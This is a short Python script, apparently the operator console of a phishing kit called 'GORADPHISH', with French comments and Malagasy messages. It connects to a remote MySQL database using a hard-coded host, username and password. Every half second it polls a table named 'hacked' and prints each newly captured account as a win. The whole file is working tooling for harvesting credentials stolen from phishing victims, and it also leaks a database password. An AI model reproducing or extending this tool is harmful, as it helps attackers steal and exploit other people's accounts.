import mysql.connector
import time
import os
from colorama import Fore, Style, init
import pyfiglet
import assets.title as ttl

# Initialisation de colorama pour Windows (inutile sous Linux, mais incluse pour la compatibilité)
init(autoreset=True)

# Fonction pour afficher le titre avec pyfiglet


# Afficher le titre "GORADPHISH" en gros textes
ttl.afficher_titre()

# Configurations de la connexion MySQL

config = {
    'host': 'mysql-tsilavina.alwaysdata.net',
    'user': 'tsilavina',
    'password': 'tsilavina2610tsilavina2610',
    'database': 'tsilavina_2610'
}


# Variable pour stocker les données précédemment reçues
donnees_vues = set()  # Utiliser un ensemble pour garder trace des données déjà affichées

def initialiser_donnees_vues():
    """Initialise les données vues avec les données actuelles au démarrage."""
    try:
        connection = mysql.connector.connect(**config)
        cursor = connection.cursor()
        cursor.execute("SELECT * FROM hacked")
        results = cursor.fetchall()
        # Ajouter toutes les données actuelles dans l'ensemble des données vues
        for row in results:
            donnees_vues.add(row)
        cursor.close()
        connection.close()
    except mysql.connector.Error as err:
        print(Fore.RED + f"Erreur : {err}")

def recuperer_nouvelles_donnees():
    global donnees_vues
    try:
        # Connect to server
        connection = mysql.connector.connect(**config)
        cursor = connection.cursor()

        # Exécution de la requête pour récupérer les données
        cursor.execute("SELECT * FROM hacked")
        results = cursor.fetchall()

        # Convertir les résultats en un ensemble pour comparaison
        nouvelles_donnees = [row for row in results if row not in donnees_vues]

        if nouvelles_donnees:
            print(Fore.GREEN + "CONGRAGULATIONS ito ny kaonty azontsika  :")
            for row in nouvelles_donnees:
                print(Fore.YELLOW + str(row))
                donnees_vues.add(row)  # Ajouter les nouvelles lignes à l'ensemble des données vues
        else:
            print(Fore.MAGENTA + "MIANDRY KAONTY VOPIRATY ...")

        # Fermeture de la connexion
        cursor.close()
        connection.close()
    except mysql.connector.Error as err:
        print(Fore.RED + f"Vérifier votre connexion internet et réssayer plus tard..")

# Initialisation pour ignorer les anciennes données
initialiser_donnees_vues()

# Boucle pour nouvelle donnés
while True:
    recuperer_nouvelles_donnees()
    time.sleep(0.5)  # Pause de 0.5 secondes avant la prochaine vérification
